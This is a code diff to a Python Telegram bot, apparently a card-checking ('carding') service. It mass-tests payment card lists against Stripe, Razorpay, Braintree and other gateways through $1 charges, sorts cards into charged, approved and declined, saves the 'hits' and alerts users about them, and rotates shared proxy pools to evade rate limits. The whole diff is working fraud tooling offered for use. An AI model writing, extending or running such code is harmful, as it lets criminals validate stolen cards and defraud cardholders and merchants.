+                f"<b>Approved</b> ➛ 0 {approved_emoji}\n"
+                f"<b>Declined</b> ➛ 0 {dead_emoji}\n"
+                f"<b>Errors</b> ➛ 0 {errors_emoji}\n"
+                f"<b>Time</b> ➛ 0s"
+            )
+            progress_msg = await message.reply_text(progress_text, parse_mode=ParseMode.HTML)
+
+        if u_id not in user_speed_controllers:
+            user_speed_controllers[u_id] = SpeedController(TIER_SPEEDS.get(tier, 900), tier)
+        speed_controller = user_speed_controllers[u_id]
+
+        semaphore = asyncio.Semaphore(CONCURRENCY)
+        stats_lock = asyncio.Lock()
+        processed_count = 0
+
+        async def update_progress(current: int):
+            if current > 0 and current < total and current % 10 != 0:
+                return
+            elapsed = int(time.time() - start_time)
+            minutes = elapsed // 60
+            seconds = elapsed % 60
+            time_str = f"{minutes}m {seconds}s" if minutes > 0 else f"{seconds}s"
+
+            if current >= total:
+                status_text = "FINISHED ✅"
+            else:
+                status_text = f"PROCESSING {current}/{total}"
+
+            progress_text = (
+                f"<b>Gateway</b> ➛  Stripe ($1)\n"
+                f"<b>Status</b> ➛ {status_text}\n"
+                f"<b>Checked</b> ➛ {current}/{total}\n"
+                f"<b>Charged</b> ➛ {stats['charged']} {charged_emoji}\n"
+                f"<b>Approved</b> ➛ {stats['approved']} {approved_emoji}\n"
+                f"<b>Declined</b> ➛ {stats['declined']} {dead_emoji}\n"
+                f"<b>Errors</b> ➛ {stats['errors']} {errors_emoji}\n"
+                f"<b>Time</b> ➛ {time_str}"
+            )
+            try:
+                await progress_msg.edit_text(progress_text, parse_mode=ParseMode.HTML)
+            except:
+                pass
+
+        async def process_single_card(card: str, idx: int):
+            nonlocal processed_count, proxy_index
+
+            await asyncio.sleep(random.uniform(0.5, 1.0))
+
+            async with semaphore:
+                await speed_controller.wait_if_needed()
+                start = time.time()
+
+                proxy_str = None
+                if user_proxies:
+                    proxy_str = user_proxies[proxy_index % len(user_proxies)]
+                    proxy_index += 1
+
+                result = await check_card_globalgreen_playwright(card, proxy_str, u_id)
+                elapsed = time.time() - start
+                speed_controller.record_response(elapsed)
+
+                bin_info = await get_bin_info(card)
+                status_category = result.get("status_category", "unknown")
+
+                async with stats_lock:
+                    processed_count += 1
+
+                    if status_category == "charged":
+                        stats["charged"] += 1
+                        stats["approved"] += 1
+                        print(f"🔥 [CHARGED] {card[:20]}...")
+                    elif status_category == "approved":
+                        stats["approved"] += 1
+                        print(f"✅ [APPROVED] {card[:20]}...")
+                    elif status_category == "declined":
+                        stats["declined"] += 1
+                        print(f"❌ [DECLINED - HIDDEN] {card[:20]}...")
+                    else:
+                        stats["errors"] += 1
+                        print(f"⚠️ [ERROR] {card[:20]}...")
+
+                    if processed_count % 10 == 0 or processed_count == total:
+                        await update_progress(processed_count)
+
+                if status_category in ["charged", "approved"]:
+                    ui, _ = format_globalgreen_response(result, card, bin_info)
+                    try:
+                        await message.reply_text(ui, parse_mode=ParseMode.HTML)
+                        print(f"📤 [SENT] {card[:20]}...")
+                    except:
+                        pass
+
+                    await save_hit_to_file(
+                        card=card, gateway=" Stripe",
+                        response=result.get("message", "Approved"),
+                        price="$1.00",
+                        bin_info=bin_info, user_id=u_id, user_tier=tier
+                    )
+
+                    if status_category == "charged":
+                        user_data = user_manager.get_user(u_id)
+                        await send_hit_notification(
+                            context=context, gateway=" Stripe", card=card,
+                            response=result.get("message", "Charged"),
+                            price="$1.00",
+                            user=user_data, bin_info=bin_info, status_category="charged"
+                        )
+                        user_manager.increment_hits(u_id)
+
+                user_manager.increment_checks(u_id, 1)
+                return result, card
+
+        tasks = [process_single_card(card, idx) for idx, card in enumerate(cards)]
+
+        for coro in asyncio.as_completed(tasks):
+            if u_id not in globalgreen_active_tasks:
+                break
+            try:
+                await coro
+            except Exception as e:
+                print(f"❌ Task error: {e}")
+                async with stats_lock:
+                    stats["errors"] += 1
+
+        if u_id in globalgreen_active_tasks:
+            total_time = time.time() - start_time
+            minutes = int(total_time // 60)
+            seconds = int(total_time % 60)
+
+            summary = (
+                f"🏁 <b>Global Green Mass Check Complete</b>\n\n"
+                f"{charged_emoji} <b>Charged</b> ➛ {stats['charged']}\n"
+                f"{approved_emoji} <b>Approved</b> ➛ {stats['approved']}\n"
+                f"{dead_emoji} <b>Declined</b> ➛ {stats['declined']} (Hidden)\n"
+                f"{errors_emoji} <b>Errors</b> ➛ {stats['errors']}\n"
+                f"📝 <b>Total</b> ➛ {total}\n"
+                f"⏱️ <b>Time</b> ➛ {minutes}m {seconds}s\n"
+            )
+
+            await update_progress(total)
+            await message.reply_text(summary, parse_mode=ParseMode.HTML)
+
+        return stats
+
+    except Exception as e:
+        print(f"❌ Global Green mass error: {e}")
+        traceback.print_exc()
+        try:
+            if progress_msg:
+                await progress_msg.edit_text(f"❌ Error: {str(e)[:100]}")
+        except:
+            pass
+    finally:
+        globalgreen_active_tasks.pop(u_id, None)
+        print(f"🏁 Global Green session ended")
 # ============ PAYPAL API POOL MANAGER ============
 
 # List of working PayPal APIs (add more as you find them)
@@ -18580,6 +20686,696 @@ async def single_check_ezycourse(update: Update, context: ContextTypes.DEFAULT_T
         add_user_credits(user_id, 1)
     finally:
         ezycourse_active_tasks.pop(user_id, None)
+
+
+
+
+# ============ GLOBAL PROXY POOL SYSTEM ============
+# Add this to your f13.py
+
+import json
+import asyncio
+import time
+import random
+from pathlib import Path
+from typing import Optional, List, Dict
+import httpx
+
+# Global proxy pool files
+GLOBAL_PROXIES_FILE = "global_proxies.json"
+GLOBAL_PROXY_STATS_FILE = "global_proxy_stats.json"
+
+class GlobalProxyPool:
+    """
+    Global proxy pool that the owner can manage.
+    Proxies are shared across all users automatically.
+    Users don't need to add their own proxies.
+    """
+    
+    def __init__(self):
+        self.proxies = []  # List of proxy strings
+        self.proxy_stats = {}  # proxy -> stats
+        self.current_index = 0
+        self._lock = asyncio.Lock()
+        self.enabled = True
+        self.last_rotation = time.time()
+        self.rotation_interval = 30  # Rotate every 30 seconds by default
+        
+        # Load from files
+        self.load_proxies()
+        self.load_stats()
+        
+        print(f"🔌 Global Proxy Pool initialized with {len(self.proxies)} proxies")
+    
+    def load_proxies(self):
+        """Load global proxies from file"""
+        if Path(GLOBAL_PROXIES_FILE).exists():
+            try:
+                with open(GLOBAL_PROXIES_FILE, 'r') as f:
+                    data = json.load(f)
+                    self.proxies = data.get('proxies', [])
+                    self.enabled = data.get('enabled', True)
+                    self.rotation_interval = data.get('rotation_interval', 30)
+                print(f"📦 Loaded {len(self.proxies)} global proxies")
+            except Exception as e:
+                print(f"⚠️ Error loading global proxies: {e}")
+                self.proxies = []
+        else:
+            self.proxies = []
+            self.save_proxies()
+    
+    def save_proxies(self):
+        """Save global proxies to file"""
+        try:
+            data = {
+                'proxies': self.proxies,
+                'enabled': self.enabled,
+                'rotation_interval': self.rotation_interval,
+                'updated_at': time.time()
+            }
+            with open(GLOBAL_PROXIES_FILE, 'w') as f:
+                json.dump(data, f, indent=2)
+        except Exception as e:
+            print(f"⚠️ Error saving global proxies: {e}")
+    
+    def load_stats(self):
+        """Load proxy stats from file"""
+        if Path(GLOBAL_PROXY_STATS_FILE).exists():
+            try:
+                with open(GLOBAL_PROXY_STATS_FILE, 'r') as f:
+                    self.proxy_stats = json.load(f)
+            except Exception as e:
+                print(f"⚠️ Error loading proxy stats: {e}")
+                self.proxy_stats = {}
+        else:
+            self.proxy_stats = {}
+    
+    def save_stats(self):
+        """Save proxy stats to file"""
+        try:
+            with open(GLOBAL_PROXY_STATS_FILE, 'w') as f:
+                json.dump(self.proxy_stats, f, indent=2)
+        except Exception as e:
+            print(f"⚠️ Error saving proxy stats: {e}")
+    
+    def add_proxy(self, proxy: str) -> bool:
+        """Add a proxy to the global pool"""
+        if not proxy or proxy in self.proxies:
+            return False
+        
+        # Validate proxy format
+        formatted = format_proxy(proxy)
+        if not formatted:
+            return False
+        
+        self.proxies.append(proxy)
+        
+        # Initialize stats
+        self.proxy_stats[proxy] = {
+            'successes': 0,
+            'failures': 0,
+            'total_checks': 0,
+            'last_used': 0,
+            'last_result': '',
+            'avg_response_time': 0,
+            'is_working': True
+        }
+        
+        self.save_proxies()
+        self.save_stats()
+        print(f"✅ Added global proxy: {mask_proxy(proxy)}")
+        return True
+    
+    def add_proxies_bulk(self, proxy_list: List[str]) -> Dict[str, int]:
+        """Add multiple proxies at once"""
+        results = {'added': 0, 'invalid': 0, 'duplicate': 0}
+        
+        for proxy in proxy_list:
+            proxy = proxy.strip()
+            if not proxy:
+                continue
+            
+            if proxy in self.proxies:
+                results['duplicate'] += 1
+                continue
+            
+            formatted = format_proxy(proxy)
+            if not formatted:
+                results['invalid'] += 1
+                continue
+            
+            self.proxies.append(proxy)
+            self.proxy_stats[proxy] = {
+                'successes': 0,
+                'failures': 0,
+                'total_checks': 0,
+                'last_used': 0,
+                'last_result': '',
+                'avg_response_time': 0,
+                'is_working': True
+            }
+            results['added'] += 1
+        
+        if results['added'] > 0:
+            self.save_proxies()
+            self.save_stats()
+            print(f"📦 Added {results['added']} global proxies")
+        
+        return results
+    
+    def remove_proxy(self, proxy: str) -> bool:
+        """Remove a proxy from the global pool"""
+        if proxy in self.proxies:
+            self.proxies.remove(proxy)
+            if proxy in self.proxy_stats:
+                del self.proxy_stats[proxy]
+            self.save_proxies()
+            self.save_stats()
+            print(f"🗑️ Removed global proxy: {mask_proxy(proxy)}")
+            return True
+        return False
+    
+    def remove_dead_proxies(self) -> int:
+        """Remove all dead proxies (5+ failures, 0 successes)"""
+        removed = 0
+        for proxy in self.proxies[:]:
+            stats = self.proxy_stats.get(proxy, {})
+            failures = stats.get('failures', 0)
+            successes = stats.get('successes', 0)
+            
+            if failures >= 5 and successes == 0:
+                self.proxies.remove(proxy)
+                if proxy in self.proxy_stats:
+                    del self.proxy_stats[proxy]
+                removed += 1
+        
+        if removed > 0:
+            self.save_proxies()
+            self.save_stats()
+            print(f"🗑️ Removed {removed} dead global proxies")
+        
+        return removed
+    
+    def get_next_proxy(self, force_new: bool = False) -> Optional[str]:
+        """Get the next proxy in rotation"""
+        if not self.enabled or not self.proxies:
+            return None
+        
+        # Remove dead proxies automatically
+        self.remove_dead_proxies()
+        
+        if not self.proxies:
+            return None
+        
+        # Rotate proxy
+        if force_new or time.time() - self.last_rotation > self.rotation_interval:
+            self.current_index = (self.current_index + 1) % len(self.proxies)
+            self.last_rotation = time.time()
+        
+        proxy = self.proxies[self.current_index]
+        
+        # Update last used
+        if proxy in self.proxy_stats:
+            self.proxy_stats[proxy]['last_used'] = time.time()
+            self.save_stats()
+        
+        return proxy
+    
+    def get_best_proxy(self) -> Optional[str]:
+        """Get the best performing proxy"""
+        if not self.proxies:
+            return None
+        
+        # Find proxy with best success rate
+        best_proxy = None
+        best_score = -1
+        
+        for proxy in self.proxies:
+            stats = self.proxy_stats.get(proxy, {})
+            total = stats.get('total_checks', 0)
+            successes = stats.get('successes', 0)
+            
+            if total == 0:
+                score = 50  # Untested - medium priority
+            else:
+                success_rate = (successes / total) * 100
+                avg_time = stats.get('avg_response_time', 10)
+                # Score: success rate weighted by speed
+                score = success_rate * (5 / max(avg_time, 0.5))
+            
+            if score > best_score:
+                best_score = score
+                best_proxy = proxy
+        
+        return best_proxy
+    
+    def record_result(self, proxy: str, success: bool, response_time: float, response_text: str = ""):
+        """Record proxy performance"""
+        if proxy not in self.proxy_stats:
+            self.proxy_stats[proxy] = {
+                'successes': 0,
+                'failures': 0,
+                'total_checks': 0,
+                'last_used': 0,
+                'last_result': '',
+                'avg_response_time': 0,
+                'is_working': True
+            }
+        
+        stats = self.proxy_stats[proxy]
+        stats['total_checks'] += 1
+        stats['last_result'] = response_text[:100]
+        stats['last_used'] = time.time()
+        
+        if success:
+            stats['successes'] += 1
+            stats['is_working'] = True
+        else:
+            stats['failures'] += 1
+            # Mark as not working after 3 consecutive failures
+            if stats['failures'] >= 3 and stats['successes'] == 0:
+                stats['is_working'] = False
+        
+        # Update average response time
+        old_avg = stats.get('avg_response_time', 0)
+        total = stats.get('total_checks', 1)
+        stats['avg_response_time'] = ((old_avg * (total - 1)) + response_time) / total
+        
+        self.save_stats()
+    
+    def get_stats(self) -> str:
+        """Get formatted statistics about the global proxy pool"""
+        if not self.proxies:
+            return "📋 No global proxies configured."
+        
+        total = len(self.proxies)
+        working = sum(1 for p in self.proxies if self.proxy_stats.get(p, {}).get('is_working', True))
+        dead = total - working
+        
+        msg = f"🌐 <b>Global Proxy Pool</b>\n\n"
+        msg += f"📊 <b>Statistics:</b>\n"
+        msg += f"   • Total Proxies: {total}\n"
+        msg += f"   • Working: {working}\n"
+        msg += f"   • Dead: {dead}\n"
+        msg += f"   • Status: {'✅ Enabled' if self.enabled else '❌ Disabled'}\n"
+        msg += f"   • Rotation Interval: {self.rotation_interval}s\n"
+        msg += f"━━━━━━━━━━━━━━━━━━━\n\n"
+        
+        # Show top proxies
+        msg += f"<b>Top Working Proxies:</b>\n"
+        
+        # Sort by success rate
+        sorted_proxies = sorted(
+            self.proxies,
+            key=lambda p: self.proxy_stats.get(p, {}).get('successes', 0) / max(self.proxy_stats.get(p, {}).get('total_checks', 1), 1),
+            reverse=True
+        )
+        
+        for proxy in sorted_proxies[:10]:
+            stats = self.proxy_stats.get(proxy, {})
+            successes = stats.get('successes', 0)
+            total_checks = stats.get('total_checks', 0)
+            success_rate = (successes / max(total_checks, 1)) * 100
+            avg_time = stats.get('avg_response_time', 0)
+            status = "✅" if stats.get('is_working', True) else "❌"
+            
+            msg += f"   {status} {mask_proxy(proxy)}\n"
+            msg += f"      Success: {success_rate:.1f}% ({successes}/{total_checks}) | Avg: {avg_time:.1f}s\n"
+        
+        if len(sorted_proxies) > 10:
+            msg += f"   ... and {len(sorted_proxies) - 10} more\n"
+        
+        return msg
+    
+    def toggle_enabled(self) -> bool:
+        """Toggle proxy pool on/off"""
+        self.enabled = not self.enabled
+        self.save_proxies()
+        return self.enabled
+    
+    def set_rotation_interval(self, seconds: int):
+        """Set proxy rotation interval"""
+        if seconds < 5:
+            seconds = 5
+        self.rotation_interval = seconds
+        self.save_proxies()
+    
+    def clear_all(self) -> int:
+        """Clear all global proxies"""
+        count = len(self.proxies)
+        self.proxies = []
+        self.proxy_stats = {}
+        self.save_proxies()
+        self.save_stats()
+        return count
+
+
+# ============ GET PROXY FUNCTION ============
+def get_proxy_for_user(user_id: int, gateway: str = 'default') -> Optional[str]:
+    """
+    Get a proxy for a user.
+    Priority: User's personal proxy > Global proxy pool
+    """
+    # Check if user has personal proxies
+    if user_id in proxy_manager.user_proxies and proxy_manager.user_proxies[user_id]:
+        # Use user's personal proxy
+        return proxy_manager.get_next_proxy_for_user(user_id)
+    
+    # Fallback to global proxy pool
+    if global_proxy_pool.enabled and global_proxy_pool.proxies:
+        proxy = global_proxy_pool.get_next_proxy()
+        if proxy:
+            print(f"🌐 [Global Proxy] Using global proxy: {mask_proxy(proxy)}")
+            return proxy
+        else:
+            print(f"⚠️ [Global Proxy] No proxies available in pool")
+    
+    print(f"⚠️ [Proxy] No proxy available, using direct connection")
+    return None
+
+
+async def get_proxy_async(user_id: int, gateway: str = 'default') -> Optional[str]:
+    """
+    Async version - get proxy for a user with rotation
+    """
+    return get_proxy_for_user(user_id, gateway)
+
+
+# ============ GLOBAL PROXY COMMANDS ============
+
+async def addglobalproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Add a proxy to the global pool (admin only)"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "🌐 <b>Add Global Proxy</b>\n\n"
+            "Usage: <code>/addglobalproxy &lt;proxy&gt;</code>\n"
+            "Example: <code>/addglobalproxy user:pass@ip:port</code>\n\n"
+            "Supported formats:\n"
+            "• <code>ip:port</code>\n"
+            "• <code>user:pass@ip:port</code>\n"
+            "• <code>user:pass:ip:port</code>\n"
+            "• <code>ip:port:user:pass</code>\n\n"
+            "Use /globalproxies to see all global proxies",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    proxy = " ".join(context.args).strip()
+    
+    if global_proxy_pool.add_proxy(proxy):
+        await update.message.reply_text(
+            f"✅ <b>Global Proxy Added!</b>\n\n"
+            f"🔌 Proxy: <code>{mask_proxy(proxy)}</code>\n"
+            f"📊 Total global proxies: {len(global_proxy_pool.proxies)}\n\n"
+            f"💡 This proxy will be used by all users automatically.",
+            parse_mode=ParseMode.HTML,
+            reply_markup=back_menu()
+        )
+    else:
+        await update.message.reply_text(
+            f"❌ Failed to add proxy.\n\n"
+            f"Either it's already in the pool or the format is invalid.",
+            parse_mode=ParseMode.HTML
+        )
+
+
+async def massglobalproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Add multiple proxies to the global pool (admin only)"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "📦 <b>Mass Add Global Proxies</b>\n\n"
+            "Usage: <code>/massglobalproxy proxy1 proxy2 proxy3 ...</code>\n"
+            "Example: <code>/massglobalproxy user:pass@ip:port user2:pass2@ip2:port2</code>\n\n"
+            "Or reply to a .txt file with /massglobalproxy",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    # Get all proxies from args
+    proxy_strings = list(context.args)
+    
+    status_msg = await update.message.reply_text(
+        f"📥 Adding {len(proxy_strings)} proxies to global pool..."
+    )
+    
+    results = global_proxy_pool.add_proxies_bulk(proxy_strings)
+    
+    result_msg = (
+        f"✅ <b>Global Proxy Bulk Add Complete</b>\n\n"
+        f"📊 <b>Results:</b>\n"
+        f"   • Added: {results['added']}\n"
+        f"   • Duplicate: {results['duplicate']}\n"
+        f"   • Invalid: {results['invalid']}\n"
+        f"━━━━━━━━━━━━━━━━━━━\n"
+        f"📦 Total global proxies: {len(global_proxy_pool.proxies)}\n"
+        f"💡 Proxies will be used by all users automatically."
+    )
+    
+    await status_msg.edit_text(result_msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
+
+
+async def removeglobalproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Remove a proxy from the global pool (admin only)"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+    
+    if not context.args:
+        await update.message.reply_text(
+            "🗑️ <b>Remove Global Proxy</b>\n\n"
+            "Usage: <code>/removeglobalproxy &lt;proxy&gt;</code>\n"
+            "Example: <code>/removeglobalproxy user:pass@ip:port</code>\n\n"
+            "Use /globalproxies to see all proxies.",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    
+    proxy = " ".join(context.args).strip()
+    
+    if global_proxy_pool.remove_proxy(proxy):
+        await update.message.reply_text(
+            f"✅ <b>Global Proxy Removed!</b>\n\n"
+            f"🔌 Proxy: <code>{mask_proxy(proxy)}</code>\n"
+            f"📊 Total global proxies: {len(global_proxy_pool.proxies)}",
+            parse_mode=ParseMode.HTML,
+            reply_markup=back_menu()
+        )
+    else:
+        await update.message.reply_text(
+            f"❌ Proxy not found in global pool.",
+            parse_mode=ParseMode.HTML
+        )
+
+
+async def globalproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show all global proxies (admin only)"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+    
+    status = global_proxy_pool.get_stats()
+    await update.message.reply_text(status, parse_mode=ParseMode.HTML, reply_markup=back_menu())
+
+
+async def globalproxy_enable_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Enable the global proxy pool (admin only)"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+    
+    global_proxy_pool.enabled = True
+    global_proxy_pool.save_proxies()
+    
+    await update.message.reply_text(
+        "✅ <b>Global Proxy Pool Enabled!</b>\n\n"
+        f"📊 Total proxies: {len(global_proxy_pool.proxies)}\n"
+        f"💡 Proxies will now be used by all users automatically.",
+        parse_mode=ParseMode.HTML,
+        reply_markup=back_menu()
+    )
+
+
+async def globalproxy_disable_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Disable the global proxy pool (admin only)"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+    
+    global_proxy_pool.enabled = False
+    global_proxy_pool.save_proxies()
+    
+    await update.message.reply_text(
+        "❌ <b>Global Proxy Pool Disabled!</b>\n\n"
+        f"📊 Total proxies: {len(global_proxy_pool.proxies)}\n"
+        f"💡 Proxies will no longer be used automatically.",
+        parse_mode=ParseMode.HTML,
+        reply_markup=back_menu()
+    )
+
+
+async def globalproxy_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show detailed global proxy statistics (admin only)"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+    
+    stats = global_proxy_pool.get_stats()
+    
+    # Add more detailed info
+    detailed_stats = stats + "\n\n"
+    detailed_stats += "━━━━━━━━━━━━━━━━━━━\n"
+    detailed_stats += "<b>Commands:</b>\n"
+    detailed_stats += "   /addglobalproxy <proxy> - Add proxy\n"
+    detailed_stats += "   /massglobalproxy <proxies> - Add multiple\n"
+    detailed_stats += "   /removeglobalproxy <proxy> - Remove proxy\n"
+    detailed_stats += "   /globalproxy_on - Enable pool\n"
+    detailed_stats += "   /globalproxy_off - Disable pool\n"
+    detailed_stats += "   /globalproxy_rotate - Force rotate\n"
+    detailed_stats += "   /globalproxy_clean - Remove dead proxies"
+    
+    await update.message.reply_text(detailed_stats, parse_mode=ParseMode.HTML, reply_markup=back_menu())
+
+
+async def globalproxy_clean_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Remove dead proxies from the global pool (admin only)"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+    
+    removed = global_proxy_pool.remove_dead_proxies()
+    
+    await update.message.reply_text(
+        f"🧹 <b>Global Proxy Cleanup Complete!</b>\n\n"
+        f"🗑️ Removed: {removed} dead proxies\n"
+        f"📊 Remaining: {len(global_proxy_pool.proxies)} proxies",
+        parse_mode=ParseMode.HTML,
+        reply_markup=back_menu()
+    )
+
+
+async def globalproxy_rotate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Force rotate to next proxy in the global pool (admin only)"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+    
+    if not global_proxy_pool.proxies:
+        await update.message.reply_text("❌ No proxies in the global pool.")
+        return
+    
+    next_proxy = global_proxy_pool.get_next_proxy(force_new=True)
+    
+    await update.message.reply_text(
+        f"🔄 <b>Global Proxy Rotated!</b>\n\n"
+        f"🔌 Next proxy: <code>{mask_proxy(next_proxy)}</code>\n"
+        f"📊 Total proxies: {len(global_proxy_pool.proxies)}",
+        parse_mode=ParseMode.HTML,
+        reply_markup=back_menu()
+    )
+
+
+async def globalproxy_handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Handle file upload for global proxies (admin only)"""
+    if update.effective_user.id != OWNER_ID:
+        await update.message.reply_text("❌ Admin only command.")
+        return
+    
+    try:
+        file = await update.message.document.get_file()
+        content = await file.download_as_bytearray()
+        content = content.decode('utf-8', errors='ignore')
+        
+        # Parse proxies from file
+        proxies = []
+        for line in content.splitlines():
+            line = line.strip()
+            if line and not line.startswith('#'):
+                proxies.append(line)
+        
+        if not proxies:
+            await update.message.reply_text("❌ No proxies found in file.")
+            return
+        
+        status_msg = await update.message.reply_text(
+            f"📥 Found {len(proxies)} proxies. Adding to global pool..."
+        )
+        
+        results = global_proxy_pool.add_proxies_bulk(proxies)
+        
+        result_msg = (
+            f"✅ <b>Global Proxy File Import Complete</b>\n\n"
+            f"📊 <b>Results:</b>\n"
+            f"   • Added: {results['added']}\n"
+            f"   • Duplicate: {results['duplicate']}\n"
+            f"   • Invalid: {results['invalid']}\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"📦 Total global proxies: {len(global_proxy_pool.proxies)}"
+        )
+        
+        await status_msg.edit_text(result_msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())
+        
+    except Exception as e:
+        await update.message.reply_text(f"❌ Error reading file: {str(e)[:100]}")
+
+
+# ============ CREATE GLOBAL INSTANCE ============
+
+global_proxy_pool = GlobalProxyPool()
+
+
+# ============ MODIFY EXISTING FUNCTIONS ============
+
+# Update the get_proxy_for_user function to use global pool as fallback
+# Replace your existing get_proxy_for_user with this:
+
+def get_proxy_for_user(user_id: int, gateway: str = 'default') -> Optional[str]:
+    """
+    Get a proxy for a user.
+    Priority: User's personal proxy > Global proxy pool
+    """
+    # Check if user has personal proxies
+    if user_id in proxy_manager.user_proxies and proxy_manager.user_proxies[user_id]:
+        # Use user's personal proxy
+        return proxy_manager.get_next_proxy_for_user(user_id)
+    
+    # Fallback to global proxy pool
+    if global_proxy_pool.enabled and global_proxy_pool.proxies:
+        proxy = global_proxy_pool.get_next_proxy()
+        if proxy:
+            print(f"🌐 [Global Proxy] Using global proxy: {mask_proxy(proxy)}")
+            return proxy
+        else:
+            print(f"⚠️ [Global Proxy] No proxies available in pool")
+    
+    print(f"⚠️ [Proxy] No proxy available, using direct connection")
+    return None
+
+
+# Update the can_use_proxy method to include global pool
+def can_use_proxy(self, user_id: int) -> bool:
+    """Check if user can use proxies (personal or global)"""
+    tier = self.get_tier(user_id)
+    
+    # If user can use proxies OR global pool is enabled
+    if self.TIERS[tier]["can_use_proxy"]:
+        return True
+    
+    # Even if tier doesn't allow personal proxies, they can use global
+    if global_proxy_pool.enabled and global_proxy_pool.proxies:
+        return True
+    
+    return False
+
+
+
 
 
 # ============ EZYCOURSE MASS CHECK ============
@@ -35971,7 +38767,7 @@ async def send_gif_with_result(
 RAZORPAY_API_POOL_CONFIG = [
     {
         "name": "Razorpay API (Railway)",
-        "url": "https://rzapi-production.up.railway.app/razorpay",
+        "url": "https://rzapi-production-d1b0.up.railway.app/razorpay",
         "type": "get",
         "params_format": "path",
         "timeout": 45,
@@ -35989,7 +38785,7 @@ RAZORPAY_API_POOL_CONFIG = [
     },
     {
         "name": "r2 (Railway)",
-        "url": "https://rzapi2-production.up.railway.app/razorpay",
+        "url": "https://rzapi2-production-5961.up.railway.app/razorpay",
         "type": "get",
         "params_format": "path",
         "timeout": 45,
@@ -47751,6 +50547,9 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         
         '/mchk0': 'stripe_auth0',
         '/chk0': 'stripe_auth0',
+        
+        '/mbtq': 'boutique',
+        '/btq': 'boutique', 
     }
     
     
@@ -48023,6 +50822,8 @@ async def handle_reply_with_command(update: Update, context: ContextTypes.DEFAUL
         asyncio.create_task(dabbagh_mass_check_logic(update, context, cards, progress_msg))
     elif gateway == 'stripe_auth0':
         asyncio.create_task(mass_check_stripe_auth0_logic(update, context, cards, progress_msg))
+    elif gateway =='boutique':
+        asyncio.create_task(mass_check_boutique_logic(update, context, cards, progress_msg))
     else:
         await update.message.reply_text(f"❌ Gateway {gateway} not implemented yet.")
     
@@ -53198,11 +55999,27 @@ def main():
     app.add_handler(CommandHandler("b3", single_check_braintree_auth))
     app.add_handler(CommandHandler("mb3", mass_check_braintree_auth))
     
+    app.add_handler(CommandHandler("gg", single_check_globalgreen))
+    app.add_handler(CommandHandler("mgg", mass_check_globalgreen))
+    
     app.add_handler(CommandHandler("st", single_check_stripe_4usd))
     app.add_handler(CommandHandler("mst", mass_check_stripe_4usd))
     
     app.add_handler(CommandHandler("chk0", single_check_stripe_auth0))
     app.add_handler(CommandHandler("mchk0", mass_check_stripe_auth0))
+    
+    app.add_handler(CommandHandler("btq", single_check_boutique_api))
+    app.add_handler(CommandHandler("mbtq", mass_check_boutique_api))
+    
+    app.add_handler(CommandHandler("addglobalproxy", addglobalproxy_command))
+    app.add_handler(CommandHandler("massglobalproxy", massglobalproxy_command))
+    app.add_handler(CommandHandler("removeglobalproxy", removeglobalproxy_command))
+    app.add_handler(CommandHandler("globalproxies", globalproxies_command))
+    app.add_handler(CommandHandler("globalproxy_on", globalproxy_enable_command))
+    app.add_handler(CommandHandler("globalproxy_off", globalproxy_disable_command))
+    app.add_handler(CommandHandler("globalproxy_stats", globalproxy_stats_command))
+    app.add_handler(CommandHandler("globalproxy_clean", globalproxy_clean_command))
+    app.add_handler(CommandHandler("globalproxy_rotate", globalproxy_rotate_command))
     
     
     app.add_handler(MessageHandler(
